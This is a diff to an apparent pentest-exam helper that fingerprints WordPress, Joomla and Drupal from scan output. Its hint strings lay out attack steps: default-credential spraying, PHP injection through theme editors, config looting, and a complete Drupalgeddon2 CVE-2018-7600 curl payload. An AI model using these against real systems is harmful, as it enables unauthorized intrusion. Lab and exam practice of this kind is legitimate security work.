@@ -1940,6 +1940,55 @@ _AJP_GNMAP = re.compile(
     r'(?i)Host:\s+([\w.:]+)[^\r\n]*8009/open/tcp//ajp13?/'
 )
 
+# iter-235: CMS version-banner fingerprints - WordPress / Joomla /
+# Drupal. Each with a per-CMS enum tool hint that's exam-legal
+# (wpscan without brute, joomscan, droopescan).
+#
+# WordPress version signals:
+#   * <meta name="generator" content="WordPress 5.7.2" />
+#   * ?ver=5.7.2 query string on /wp-includes/js/... resources
+#   * /wp-content/ or /wp-admin/ path presence
+_WORDPRESS_META = re.compile(
+    r'(?i)<meta\s+name\s*=\s*[\'"]generator[\'"]\s+content\s*=\s*'
+    r'[\'"]WordPress\s+(\d+\.\d+(?:\.\d+)?)'
+)
+_WORDPRESS_QUERY_VER = re.compile(
+    r'(?i)/wp-(?:includes|content|admin)/[^\s\'"?]*\?ver=(\d+\.\d+(?:\.\d+)?)'
+)
+_WORDPRESS_PATH = re.compile(
+    r'(?i)(?:https?://[^/\s]+)?/(?:wp-admin|wp-login\.php|'
+    r'wp-content/(?:plugins|themes|uploads))/'
+)
+
+# Joomla version signals:
+#   * <meta name="generator" content="Joomla! - Open Source ..." />
+#   * X-Content-Encoded-By: Joomla! X.Y
+#   * /administrator/ path with Joomla login shape
+_JOOMLA_META = re.compile(
+    r'(?i)<meta\s+name\s*=\s*[\'"]generator[\'"]\s+content\s*=\s*'
+    r'[\'"]Joomla!(?:\s*-\s*[^\'"]{0,200})?'
+    r'[\'"]'
+)
+_JOOMLA_VERSION = re.compile(
+    r'(?i)Joomla!\s*(?:CMS|Version|)\s*(\d+\.\d+(?:\.\d+)?)'
+)
+_JOOMLA_HEADER = re.compile(
+    r'(?im)^X-Content-Encoded-By\s*:\s*Joomla!?\s*(\d+\.\d+(?:\.\d+)?)?'
+)
+
+# Drupal version signals (complements iter-22's pre-7.59/8.5.1
+# payload-oriented detector):
+#   * <meta name="Generator" content="Drupal 9 (https://www.drupal.org)" />
+#   * X-Generator: Drupal 9 (https://www.drupal.org)
+#   * Drupal.settings JS presence
+_DRUPAL_HEADER = re.compile(
+    r'(?im)^X-Generator\s*:\s*Drupal\s+(\d+(?:\.\d+)?)'
+)
+_DRUPAL_META = re.compile(
+    r'(?i)<meta\s+name\s*=\s*[\'"]Generator[\'"]\s+content\s*=\s*'
+    r'[\'"]Drupal\s+(\d+(?:\.\d+)?)'
+)
+
 # iter-234: modern web-app version-banner CVE hints. Payload IOCs
 # for Log4Shell/Spring4Shell/Confluence OGNL are already covered by
 # per-line matchers; missing was the DEFENDER-side signal - captured
@@ -3176,6 +3225,105 @@ def _multiline_passes(path, report, store):
                                  f"side: use marshalsec-0.0.3-SNAPSHOT-"
                                  f"all.jar with LDAPRefServer +"
                                  f" Exploit.class payload"))
+
+        # iter-235: WordPress fingerprint. Fires when any of:
+        # - <meta generator> tag with version
+        # - ?ver=X.Y.Z query on /wp-includes/ resources
+        # - /wp-admin or /wp-login.php path reference (weakest;
+        #   requires no other CMS signal)
+        _wp_meta = _WORDPRESS_META.search(text[:32768])
+        _wp_qver = _WORDPRESS_QUERY_VER.search(text[:32768])
+        _wp_path = _WORDPRESS_PATH.search(text[:16384])
+        if _wp_meta or _wp_qver or _wp_path:
+            _wv = ((_wp_meta.group(1) if _wp_meta else None)
+                   or (_wp_qver.group(1) if _wp_qver else "unknown"))
+            _wp_host_m = re.search(
+                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
+                text[:16384])
+            _wp_host = (_wp_host_m.group(1) if _wp_host_m
+                        else "<wp-host>")
+            report.add("HIGH", "SECRET-SIDECHANNEL", path,
+                       _ln(_wp_meta or _wp_qver or _wp_path),
+                       f"WordPress {_wv} exposed on {_wp_host} - "
+                       f"enum + default cred spray",
+                       hint=(f"unauth enum: wpscan --url http://"
+                             f"{_wp_host} --enumerate p,vp,u,vt "
+                             f"(exam-legal; NO --passwords bruteforce)"
+                             f"  |  user discovery: curl -s http://"
+                             f"{_wp_host}/wp-json/wp/v2/users "
+                             f"(REST enum) OR /?author=1..N (iterate)"
+                             f"  |  /wp-login.php default creds: "
+                             f"admin:admin, admin:password, admin:"
+                             f"wordpress  |  post-cred RCE via "
+                             f"plugin upload: /wp-admin/plugin-install"
+                             f".php OR theme editor at /wp-admin/"
+                             f"theme-editor.php - inject PHP into "
+                             f"404.php  |  post-cred loot: pull "
+                             f"wp-config.php via LFI or after RCE - "
+                             f"contains DB creds"))
+
+        # iter-235: Joomla fingerprint.
+        _jm_meta = _JOOMLA_META.search(text[:32768])
+        _jm_ver = _JOOMLA_VERSION.search(text[:32768])
+        _jm_hdr = _JOOMLA_HEADER.search(text[:16384])
+        if _jm_meta or _jm_ver or _jm_hdr:
+            _jmv = ((_jm_ver.group(1) if _jm_ver else None)
+                    or (_jm_hdr.group(1) if _jm_hdr and _jm_hdr.group(1)
+                         else "unknown"))
+            _jm_host_m = re.search(
+                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
+                text[:16384])
+            _jm_host = (_jm_host_m.group(1) if _jm_host_m
+                        else "<joomla-host>")
+            report.add("HIGH", "SECRET-SIDECHANNEL", path,
+                       _ln(_jm_meta or _jm_ver or _jm_hdr),
+                       f"Joomla {_jmv} exposed on {_jm_host} - enum "
+                       f"+ default cred spray",
+                       hint=(f"unauth enum: joomscan --url http://"
+                             f"{_jm_host}  |  /administrator login "
+                             f"default creds: admin:admin, admin:"
+                             f"password, admin:joomla  |  post-cred "
+                             f"RCE: template editor at /administrator/"
+                             f"index.php?option=com_templates - "
+                             f"inject PHP into a template file"))
+
+        # iter-235: Drupal fingerprint (banner-side, complements
+        # iter-22 pre-7.59/8.5.1 payload-marker detector).
+        _dp_hdr = _DRUPAL_HEADER.search(text[:16384])
+        _dp_meta = _DRUPAL_META.search(text[:32768])
+        if _dp_hdr or _dp_meta:
+            _dv = (_dp_hdr.group(1) if _dp_hdr
+                    else _dp_meta.group(1))
+            _dp_host_m = re.search(
+                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
+                text[:16384])
+            _dp_host = (_dp_host_m.group(1) if _dp_host_m
+                         else "<drupal-host>")
+            # Drupalgeddon2 CVE-2018-7600 hint if Drupal 7 or 8
+            # (regardless of minor since /?q=user/... trigger works).
+            _dg_hint = ""
+            try:
+                _dv_major = int(_dv.split(".")[0])
+                if _dv_major in (7, 8):
+                    _dg_hint = ("  |  CVE-2018-7600 Drupalgeddon2 (D7/"
+                                "D8 <7.58/8.3.9/8.4.6/8.5.1): curl -s "
+                                f"'http://{_dp_host}/?q=user/password&"
+                                "name%5B%23post_render%5D%5B%5D=exec&"
+                                "name%5B%23markup%5D=id&name%5B%23"
+                                "type%5D=markup' -d 'form_id=user_pass"
+                                "&_triggering_element_name=name&"
+                                "_triggering_element_value=&opz=E-mail+"
+                                "new+password'")
+            except (ValueError, IndexError):
+                pass
+            report.add("HIGH", "SECRET-SIDECHANNEL", path,
+                       _ln(_dp_hdr or _dp_meta),
+                       f"Drupal {_dv} exposed on {_dp_host} - enum + "
+                       f"exploit chain",
+                       hint=(f"unauth enum: droopescan scan drupal "
+                             f"-u http://{_dp_host}  |  users at "
+                             f"/user/1, /user/2 iterate  |  post-cred "
+                             f"path: install malicious module{_dg_hint}"))
 
     # iter-199: OpenSSH banner detection + CVE range flags. Emits INFO
     # RECON per unique version + a HIGH marker for each known-vulnerable
